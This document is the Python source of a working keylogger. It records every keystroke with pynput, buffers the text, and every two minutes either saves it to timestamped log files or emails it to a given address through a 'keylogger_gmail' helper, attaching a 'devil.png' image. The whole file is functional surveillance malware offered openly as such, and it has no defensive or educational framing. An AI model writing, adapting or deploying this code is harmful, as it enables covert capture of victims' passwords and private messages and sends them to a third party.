import sys
import os

# Include the script's directory in the system path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Keyboard listener module
from pynput.keyboard import Key, Listener

# Timer for log intervals
from threading import Timer

# For creating logfile names
from datetime import datetime

# Import the keylogger Gmail module
import keylogger_gmail

LOG_TIMER = 120  # Interval in seconds for saving or sending logs

# Verify if the necessary command-line argument is given
if len(sys.argv) > 1:
    is_send_email = sys.argv[1]  # 'true' to send email, 'false' to log to file
else:
    is_send_email = "false"  # Default to logging to file if no argument

sender = ""
to = ""

# Set sender and recipient emails if provided in command-line arguments
if len(sys.argv) == 4:
    sender = sys.argv[2]  # Email address of the sender
    to = sys.argv[3]  # Email address of the recipient

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""  # Buffer for recorded keystrokes
        self.start_dt = datetime.now()  # Start time for logfile naming
        self.end_dt = datetime.now()  # End time for logfile naming

    def on_release(self, key):
        ''' 
        Triggered whenever a key is released.
        The key argument contains the released key's data.
        '''
        char = ""
        if key == Key.space:
            char = " "
        elif key == Key.enter:
            char = "[ENTER]\n"
        else:
            char = str(key).replace("'", "")
        self.log += char  # Append keystroke to log

    def create_filename(self):
        ''' Generate logfile name based on date and time. '''
        start_date = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_date = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"Keylog-{start_date}_{end_date}"

    def save_to_file(self):
        ''' 
        Save the log to a file in the "logs" folder, creating the folder if needed.
        '''
        # Create "logs" directory if it doesn't exist
        if not os.path.exists("logs"):
            os.makedirs("logs")

        # Write the log to a file in the "logs" directory
        with open(os.path.join("logs", f"{self.filename}.txt"), "w") as f:
            print(self.log, file=f)

        print(f"[+] Saved {self.filename}.txt in the 'logs' directory")

    def create_report(self):
        '''
        Check if there are new logs to send via email or save to file.
        Reset the log buffer and timer afterward.
        '''
        if self.log:
            self.end_dt = datetime.now()
            self.create_filename()

            if is_send_email == "true":
                keylogger_gmail.send_email_with_embedded_image(
                    sender, to, self.filename, self.log, "devil.png"
                )
            else:
                self.save_to_file()

            self.start_dt = datetime.now()

        # Reset the log buffer and restart the timer
        self.log = ""
        timer = Timer(interval=self.interval, function=self.create_report)
        timer.daemon = True
        timer.start()

    def start(self):
        # Begin listening for keyboard events
        with Listener(on_release=self.on_release) as l:
            l.join()

if __name__ == "__main__":
    keylogger = Keylogger(interval=LOG_TIMER)
    keylogger.start()
